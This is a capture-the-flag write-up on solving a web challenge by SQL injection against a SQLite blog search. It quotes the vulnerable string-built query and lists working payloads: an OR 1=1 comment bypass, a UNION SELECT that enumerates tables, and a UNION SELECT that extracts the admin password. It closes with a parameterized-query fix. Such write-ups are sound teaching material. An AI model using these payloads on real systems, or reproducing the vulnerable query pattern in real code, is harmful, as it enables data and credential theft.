# Querying Flags (SQL Injection)

| Detail | Value |
| :--- | :--- |
| **Challenge Name** | Querying Flags |
| **Category** | Web (SQL Injection) |
| **Difficulty** | Easy |
| **Target URL** | http://52.76.163.244:5000 (Based on the prompt) |

---

## 💡 Description

The challenge presented a simple search interface for a "CTF Blog" that was vulnerable to **SQL Injection (SQLi)**. The goal was to exploit this vulnerability to extract three separate flags hidden within the underlying **SQLite** database.

The vulnerable code (later confirmed via `app.py`) dynamically constructed an SQL query by embedding user input:

```sql
sql_query = f"SELECT id, title, content FROM posts WHERE title LIKE '%Hello {query_input}%' AND hidden = 0 LIMIT 3"
```

The application displayed three columns (id, title, content) which allows easy debugging and exploitation.

## Steps Taken

**Phase 1: Retrieving FLAG_1**
Bypass the WHERE clause to retrieve all posts, including hidden ones.
Initial assumptions: The ``posts`` table contains a hidden flag.

| Step      | Query           | Outcome                                                                 |
|-----------|------------------|-------------------------------------------------------------------------|
| **Test**  | `%' OR '1'='1`   | Returned multiple results but failed to reveal the hidden flag          |
| **Fail**  | *(syntax issue)* | Final quote from the original query caused string termination problems  |
| **Success** | `%' OR 1=1 --` | `--` commented out the rest of the query, bypassing `AND hidden = 0`    |

![flag1](https://github.com/candypopZZ/ctf-writeup/blob/main/images/web.png?raw=true)

**Phase 2: Retrieving FLAG_2**
Discover the name of the secret table where FLAG_2 is stored.

| Step               | Query/Payload                                                                                                         | Outcome                                                          |
|--------------------|------------------------------------------------------------------------------------------------------------------------|------------------------------------------------------------------|
| **Assumption**     | The database uses 3 columns (id, title, content). The secret table name is obfuscated.                                | Correct.                                                         |
| **Successful Query** | `%' UNION SELECT 1, group_concat(tbl_name), 3 FROM sqlite_master WHERE type='table' AND tbl_name NOT LIKE 'sqlite_%' --` | Success! Returned: `posts, t0L3e3e3eeeaa44kTh33e, users`.        |
| **Result**         | —                                                                                                                      | **Flag 2 Found (secret table name).**                           |

![flag2](https://github.com/candypopZZ/ctf-writeup/blob/main/images/flag2.png?raw=true)

**Phase 2: Retrieving FLAG_2**
Extract the password for the 'admin' user from the users table, which is confirmed to hold FLAG_3 using UNION SELECT.

| Step              | Query/Payload                                                              | Outcome                               |
|-------------------|----------------------------------------------------------------------------|----------------------------------------|
| **Assumption**     | Flag is in the `users` table in the `password` column for the admin user. | Correct.                               |
| **Successful Query** | `%' UNION SELECT 1, password, 3 FROM users WHERE username='admin' --`      | Success! Password injected into title. |
| **Result**        | —                                                                          | **Flag 3 Found.**                      |

![flag3](https://github.com/candypopZZ/ctf-writeup/blob/main/images/flag2.png?raw=true)

## Final Flag
```HEX{sqli_byp4sS_t0L3e3e3eeeaa44kTh33e_whole_d4t3b4s3}```

## Patching/How to Fix it??

The vulnerability exists due to the use of **string concatenation** to build the SQL query. The defense is to use **Parameterized Queries** (or Prepared Statements) where the user input is passed as a data parameter, not as executable SQL code.

**Vulnerable Code:**
```Python
sql_query = f"SELECT id, title, content FROM posts WHERE title LIKE '%Hello {query_input}%' AND hidden = 0 LIMIT 3"
cursor.execute(sql_query) # Direct execution of concatenated string
```

**Secure Code**
```Python
# The search term becomes a placeholder ('?')
sql_query = "SELECT id, title, content FROM posts WHERE title LIKE ? AND hidden = 0 LIMIT 3"
search_term = f"%Hello {query_input}%" # Input is treated as a literal string
cursor.execute(sql_query, (search_term,)) # Input is passed as data
```
